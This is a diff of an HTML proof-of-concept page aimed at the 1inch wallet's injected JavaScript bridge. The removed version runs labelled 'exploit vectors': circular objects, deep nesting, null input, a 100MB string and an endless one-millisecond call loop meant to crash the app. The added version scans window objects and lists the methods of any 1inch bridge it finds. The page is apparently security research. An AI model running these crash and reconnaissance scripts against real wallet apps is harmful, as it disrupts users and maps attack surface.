@@ -1,56 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Bridge Security PoC</title>
-</head>
-<body style="background: #0e0e10; color: #efefef; font-family: sans-serif; text-align: center; padding: 40px;">
+<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
 
-    <div style="border: 1px solid #333; padding: 20px; border-radius: 15px; background: #1c1c1e;">
-        <h2 style="color: #ff453a;">⚠️ Bridge Injection PoC</h2>
-        <p style="font-size: 14px; color: #aaa;">Target: <code>OneInchiOSWallet.init</code></p>
-        
-        <button onclick="executePoC()" style="padding: 15px 30px; background: #ff453a; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;">
-            RUN ALL EXPLOIT VECTORS
-        </button>
+    <h3>🔍 BRIDGE DIAGNOSTIC MODE</h3>
+    <button onclick="scanBridge()" style="padding: 15px; background: #333; color: #0f0; border: 1px solid #0f0; width: 100%;">
+        SCAN FOR ACTIVE BRIDGE
+    </button>
 
-        <p id="status" style="margin-top: 20px; font-size: 12px; color: #666;">Status: Ready</p>
+    <div id="results" style="margin-top: 20px; text-align: left; font-size: 12px; white-space: pre-wrap;">
+        Waiting for scan...
     </div>
 
     <script>
-    function executePoC() {
-        const bridge = window.OneInchiOSWallet;
-        const status = document.getElementById('status');
+    function scanBridge() {
+        const results = document.getElementById('results');
+        results.innerHTML = "Scanning standard bridges...\n";
         
-        if (!bridge) {
-            status.innerText = "Error: Bridge not detected. Use 1inch Browser.";
-            return;
-        }
+        // Daftar kemungkinan nama bridge 1inch
+        const targets = [
+            'OneInchiOSWallet', 
+            'OneInchSolanaWallet', 
+            'OneInchAndroidWallet', 
+            'ethereum', 
+            'oneinch'
+        ];
 
-        try {
-            status.innerText = "Executing vectors...";
-            
-            // Vector 1: Circular Object (JSON logic bomb)
-            const circular = {}; circular.a = circular;
-            bridge.init(circular);
+        targets.forEach(t => {
+            if (window[t]) {
+                results.innerHTML += `✅ FOUND: window.${t}\n`;
+                // List semua fungsi yang ada di dalam bridge itu
+                const methods = Object.getOwnPropertyNames(window[t]);
+                results.innerHTML += `   Methods: [${methods.join(', ')}]\n\n`;
+            } else {
+                results.innerHTML += `❌ NOT FOUND: window.${t}\n`;
+            }
+        });
 
-            // Vector 2: Deep Nesting (Stack overflow test)
-            let nested = {}; let cur = nested;
-            for(let i=0; i<5000; i++) { cur.n = {}; cur = cur.n; }
-            bridge.init(nested);
-
-            // Vector 3: Null Type Injection
-            bridge.init(null);
-
-            // Vector 4: Resource Exhaustion (Memory Flood)
-            const junk = "X".repeat(100 * 1024 * 1024); // 100MB
-            bridge.init(junk);
-
-            // Infinite loop to ensure crash
-            setInterval(() => bridge.init(Date.now().toString()), 1);
-
-        } catch(e) {
-            console.log("Caught expected error: " + e.message);
+        // Jika semua gagal, scan seluruh objek window yang punya kata 'Inch'
+        results.innerHTML += "\nScanning all window objects for 'Inch' keywords...\n";
+        for (let prop in window) {
+            if (prop.toLowerCase().includes('inch')) {
+                results.innerHTML += `⭐ POTENTIAL: window.${prop}\n`;
+            }
         }
     }
     </script>
